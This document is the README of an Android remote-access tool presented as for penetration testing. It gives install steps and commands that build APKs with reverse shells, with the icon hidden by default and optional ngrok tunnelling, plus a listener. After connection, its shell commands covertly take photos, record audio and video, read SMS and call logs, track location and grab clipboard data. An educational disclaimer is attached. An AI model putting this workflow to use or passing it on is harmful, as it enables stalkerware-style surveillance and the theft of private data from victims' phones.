# AndroCliW - Android CLI Tool

[![PyPI version](https://badge.fury.io/py/androcli.svg)](https://badge.fury.io/py/androcli)
[![Python](https://img.shields.io/pypi/pyversions/androcli.svg)](https://pypi.org/project/androcli/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

AndroCliW is a powerful command-line tool for Android penetration testing and reverse shell operations. This tool allows you to build APK files with reverse shell capabilities and interact with Android devices remotely.

## Features

- 🔧 **APK Building**: Build custom APK files with reverse shell capabilities
- 🌐 **Ngrok Integration**: Use ngrok for tunneling connections
- 📱 **Remote Shell**: Get interactive shell access to Android devices
- 🎯 **Penetration Testing**: Designed for security professionals and researchers
- 🔒 **Stealth Options**: Configurable icon visibility for stealth operations

## Installation

### From PyPI (Recommended)

```bash
pip install androcli
```

### From Source

```bash
git clone https://github.com/AryanVBW/androcli.git
cd androcli
pip install -e .
```

## Requirements

- Python 3.6 - 3.8
- Java 8 (for APK building)
- Android SDK (optional, for advanced features)

## Usage

### Basic Commands

```bash
# Build an APK with reverse shell
androcli --build -i <IP_ADDRESS> -p <PORT> -o <OUTPUT_APK_NAME>

# Start shell listener
androcli --shell -i <IP_ADDRESS> -p <PORT>

# Build APK with ngrok tunneling
androcli --build --ngrok -p <PORT> -o <OUTPUT_APK_NAME>

# Build APK with hidden icon
androcli --build -i <IP_ADDRESS> -p <PORT> -o <OUTPUT_APK_NAME> --icon
```

### Command Line Options

- `--build`: Build the APK file
- `--shell`: Start the shell listener
- `--ngrok`: Use ngrok for tunneling
- `-i, --ip <IP>`: Specify the IP address
- `-p, --port <PORT>`: Specify the port number
- `-o, --output <NAME>`: Specify the output APK name
- `--icon`: Make the app icon visible (default: hidden)

### Shell Commands

Once connected to a device, you can use various commands:

- `deviceInfo`: Get basic device information
- `camList`: List available cameras
- `takepic [cameraID]`: Take a picture
- `startVideo [cameraID]`: Start video recording
- `stopVideo`: Stop video recording
- `startAudio`: Start audio recording
- `stopAudio`: Stop audio recording
- `getSMS [inbox|sent]`: Get SMS messages
- `getCallLogs`: Get call logs
- `shell`: Start interactive shell
- `vibrate [times]`: Vibrate the device
- `getLocation`: Get device location
- `getIP`: Get device IP address
- `getSimDetails`: Get SIM card details
- `getClipData`: Get clipboard data
- `getMACAddress`: Get MAC address
- `clear`: Clear screen
- `exit`: Exit the session

## Project Structure

```
androcli/
├── androcli/
│   ├── __init__.py
│   ├── main.py
│   └── utils.py
├── Android_Code/          # Android source code
├── Compiled_apk/          # Pre-compiled APK template
├── Jar_utils/             # Java utilities (apktool, signing)
├── Dumps/                 # Output directory for captured data
├── setup.py
├── requirements.txt
└── README.md
```

## Security Notice

⚠️ **Important**: This tool is designed for educational purposes and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before using this tool on any devices or networks. Unauthorized access to computer systems is illegal.

## Legal Disclaimer

This tool is provided for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this tool. Always ensure you have explicit permission before testing on any systems you do not own.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

**AryanVBW**
- Email: whitedevil367467@gmail.com
- GitHub: [@AryanVBW](https://github.com/AryanVBW)

## Support

If you encounter any issues or have questions, please [open an issue](https://github.com/AryanVBW/androcli/issues) on GitHub.

---

**Note**: This tool requires Java 8 for APK building functionality. Make sure you have the appropriate Java version installed and configured in your system PATH.